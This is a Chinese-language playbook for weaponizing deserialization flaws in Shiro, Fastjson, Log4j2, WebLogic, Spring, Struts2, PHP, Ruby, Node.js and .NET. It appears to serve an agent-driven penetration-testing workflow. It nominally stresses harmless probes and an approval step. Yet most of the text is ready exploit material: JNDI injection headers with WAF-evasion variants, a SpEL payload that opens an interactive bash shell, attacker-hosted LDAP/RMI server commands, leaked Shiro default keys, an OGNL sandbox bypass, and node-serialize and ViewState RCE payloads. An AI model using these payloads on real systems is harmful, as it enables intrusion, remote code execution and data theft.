---
id: java-deser-playbook
title: Java 反序列化武器化手册（Shiro/Fastjson/Log4j2/原生/WebLogic）
tags: java,反序列化,shiro,fastjson,log4j,weblogic,s4
---
# Java 反序列化武器化（三通道之③组件剧本）

> 全部验证遵循「无害探针先行」：能回连证明的不执行命令，能执行命令的不落盘。真实利用转 S5 审批。

## 一、Shiro rememberMe（<=1.2.4 默认 key / key 泄露）

```bash
# ① 特征：Set-Cookie 含 rememberMe=deleteMe
curl -sik https://目标/ | grep -i "rememberMe=deleteMe" && echo SHIRO特征
# ② 无害探针：用已知默认 key 列表（ikon/gcc 等）构造 rememberMe cookie，
#    payload=DNS 回连（URLDNS 类），命中即 key 有效（ysoserial URLDNS + dnslog 域名）
java -jar ysoserial.jar URLDNS "http://shiro-probe.<oob域名>" > probe.ser
python3 shiro_exp.py --key-list keys.txt --cookie probe.ser   # 命中哪个 key 会回显
# ③ key 确认后 gadget 链选择（CommonsBeanutils/CommonsCollections 版本相关）→ 转 S5
```

## 二、Fastjson / Jackson autoType

```bash
# 探针：DNS 回连类（不执行任何命令）
curl -sk 'https://目标/api' -H 'Content-Type: application/json' \
  -d '{"@type":"java.net.Inet4Address","val":"fastjson-probe.<oob域名>"}'
# Jackson: ["java.net.Inet4Address","fastjson-probe.<oob域名>"] 形态
# 回连命中 = autoType 可用 → 按目标 JDK/依赖选 gadget（JNDI 注入需出网，转 S5）
```

## 三、Log4j2 JNDI（CVE-2021-44228）

```bash
# header 全点注入（User-Agent/X-Api-Version/Referer…），${jndi:ldap://无命令回连}
for h in User-Agent X-Api-Version Referer X-Forwarded-For; do
  curl -sk "https://目标/" -H "$h: \${jndi:ldap://log4j-probe.<oob域名}/x}" -o /dev/null -w "$h %{http_code}\n"
done
# 回连命中 → JNDI 利用面（版本 2.15 修补情况）→ 转 S5
```

## 四、原生 Java 反序列化（rO0AB / aced0005）

```bash
# 特征扫描：cookie/参数/请求体
curl -sik https://目标/ | grep -o "rO0AB" | head -1
# gadget 选择：先指纹依赖（commons-collections 版本/JBoss/Weblogic），
# ysoserial URLDNS 探针确认反序列化确实发生 → CC 链/JBossUtils 等按依赖选 → 转 S5
```

## 五、WebLogic（T3/IIOP）

```bash
nmap -sV --script weblogic-t3-info -p 7001 目标   # 确认 T3 开放与版本
# CVE 检索（cve-weaponization）按版本过滤：CVE-2023-21839/2020-14882…
# 存在性验证用官方探测类脚本，命令执行类转 S5 审批
```

## 纪律

- 探针载荷只允许 DNS/HTTP 回连类； gadgets 一律「确认可达后才在 S5 受控执行」
- 所有探针与回连写明用途进审批 reason；证据=回连记录 + 响应差异
- 依赖指纹不明时先 `ls ~/.m2` 类无法进行→用 web 报错/静态资源推断，禁止盲发 gadget

## JDBC 假服务器与 SpEL header

- **JDBC URL 可控反序列化**：`queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true` → 每次查询触发 show session status → getObject→readObject → 配假 MySQL（greeting hex `4a0000000a352e372e3139...`，按 auto_increment_increment/show warnings/set names/show session status 逐报文应答，BLOB 回传 ysoserial 数据，监听 3309）
- **SpEL 走 header**：Spring Cloud Function `spring.cloud.function.routing-expression` header 直解 parseExpression；`T(java.lang.Runtime).getRuntime().exec("bash -c {echo,base64}|{base64,-d}|{bash,-i}")`
- **JNDI post-8u191 两绕**：LDAP 序列化 gadget 直发；BeanFactory+EL
- **ThinkPHP 5.1.37 反序列化全链**：`__destruct→removeFiles→file_exists(对象)→__toString→toArray(append 键名可控)→getAttr→__call→filter=system`；private 属性序列化 `%00类名%00属性名`（长度+2）——手工改 payload 长度必用

### JNDI/EL/OGNL 深化与多语言反序列化

JDK 版本分界表：<8u121 RMI+LDAP 均可；8u121-8u190 仅 LDAP；≥8u191 均禁→LDAP 返回序列化 gadget 绕过。服务端三件套：`java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://atk/#Exp" 1389`；`JNDI-Injection-Exploit.jar -C "cmd" -A atk_ip`；RogueJndi。JRMP：`ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"`。BeanFactory+EL LDAP 属性表：`javaClassName: javax.el.ELProcessor`；`javaFactory: BeanFactory`；`forceString: x=eval`；`x: Runtime...exec("id")`。Log4j2 WAF 混淆六式（`${${lower:j}ndi:...}` 等）+拆分绕过（两个请求头拼回完整表达式）+版本指纹 `${jndi:ldap://${sys:java.version}.TOKEN/}`（受影响 2.0-beta9-2.14.1）；最小无害判据 `${jndi:dns://TOKEN/}`；**ERROR/FATAL 级日志点才触发**。JNDI sink 清单：Spring JndiTemplate、H2 Console、Druid 配置端点、vCenter、Fastjson JdbcRowSetImpl。

EL/OGNL 探针区分：`%{7*7}`=49→OGNL；`${7*7}`=49 且 `%{7*7}` 原样→SpEL；`${T(java.lang.Math).random()}` 出浮点=SpEL 确证；`%{#context}` 转储=OGNL 确证。SpEL 三载荷+SimpleEvaluationContext 绕过（`''.class.forName('java.lang.Runtime')...`）。OGNL 沙箱绕过全链（`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS...` + `excludedClasses.clear()`）。Struts2 注入位表：S2-045→Content-Type；S2-046→multipart 文件名；S2-016→redirect: 前缀；S2-048→ActionMessage；S2-057→namespace 路径。Confluence CVE-2021-26084 探针：POST createpage-entervariables.action，body `queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027`（回显 9 确证）。Spring Cloud Gateway CVE-2022-22947 四步（POST route→refresh→GET 读头→DELETE 清痕）。Java EL 载荷：`${"".getClass().forName("java.lang.Runtime")...}`。报错指纹补：`SpelEvaluationException`→SpEL；`javax.el.ELException`→JavaEL。

**多语言反序列化补全**：ysoserial 链清单（CC1-7/Spring1-2/Jdk7u21 无依赖/URLDNS）；RMI 一键 `ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 "id"`（≤8u111）；Shiro 四枚 key：`kPH+bIxk5D2deZiIxcaaaA==`、`wGJlpLanyXlVB1LUUWolBg==`、`4AvVhmFLUs0KTA3Kprsdag==`、`Z3VucwAAAAAAAAAAAAAAAA==` + SHIRO-721 padding oracle；phpMyAdmin 反序列化读文件 `O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}`；PHPGGC：`phpggc -l`、Laravel/RCE1-10、phar 生成 `phpggc -p phar -o x.phar Monolog/RCE1 system id`，phar 触发函数清单（file_exists/fopen/is_file/getimagesize 等）+ phar-jpg polyglot；Python pickle `__reduce__` 模板 + RestrictedUnpickler 白名单过宽判据（safe_builtins 含 eval/exec 即仍可利用）；PHP create_function 组合（private 属性 `\0类名\0` 前缀）。**Ruby**（整语言）：Marshal `\x04\x08` 指纹；YAML.load Gem 链（`loaded_from: "|id"`）；Gem::Installer→Net::WriteAdapter→`git_set: id`；工具 elttam/ruby-deserialization。**Node.js**（整语言）：node-serialize `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`（尾部 IIFE）；funcster→constructor.constructor→process.mainModule.require。**.NET payload 级**：指纹 `AAEAAAD/////`（BinaryFormatter）；`ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd" --validationalg=SHA1 --validationkey=KNOWN_KEY`；JSON.NET `$type` ObjectDataProvider；Blacklist3r。
## v4.8 M6 工具通道兼容性声明

> 口径（loop-core v4.8 纪律 3）：先 probe 后 batch——每个外部工具对目标首次使用前先用小样本探针确认可用性，探针被拦/挂起先切适配通道再批量；探针结果写入交付物工具声明小节。各工具在「挑战型 WAF / 封闭站」下的可用性与适配通道：

- nmap：传输层扫描与应用层挑战无关——挑战型 WAF 下可用；封闭站/网关白名单外端口可能全 filtered——先 probe（top100 快扫）确认端口可达性再批量，必要时 --max-rate 限速防封锁。
- curl：低频手工请求始终可用——也是挑战态复放的最小工具（channel-snapshot 快照 cookie/UA 复放）；禁用它做大批量枚举。

## v5.6.0 证据分层与版本适用性（三凭证审计补强）

### 三层证据分离（此前指纹/回连/执行混谈——现在逐层记账）

| 层 | 动作 | 证据 | coverage 状态 |
|---|---|---|---|
| L1 候选指纹 | 反序列化特征点识别（rO0AB/Cookie 特征/接口形态） | 特征请求/响应原文 | vulnerable 候选（不入 finding） |
| L2 无害回连 | DNS/HTTP 回连 payload（dnslog 类可控外联） | 回连日志 + 时间戳 | vulnerable（可达性确证） |
| L3 执行证明 | 无害命令回显（`id`/`echo jt-probe`）或文件存在性读 | 命令输出原文 | vulnerable 确证（RCE） |
| L4 实验室利用 | 提权/驻留类 | isolated_lab 档 | 不在生产档执行 |

- 每层独立判据：L1≠漏洞；L2=可达性；L3=RCE 确证（record_finding confidence=确证 cwe= CWE-502）。
- **版本适用性**：组件版本 × 反序列化 gadget 链可用性对照（CommonsCollections 各版本阈值/Fastjson autoType 各版本关闭状态/JRE 版本对 gadget 限制）——指纹命中但 gadget 不适用 = vulnerable 降级 needs_follow_up（注明"版本约束待验证"）。
- 误报排除：DNS 回连可能来自安全设备主动解析——用双通道（DNS+HTTP 独立回连）交叉确认。
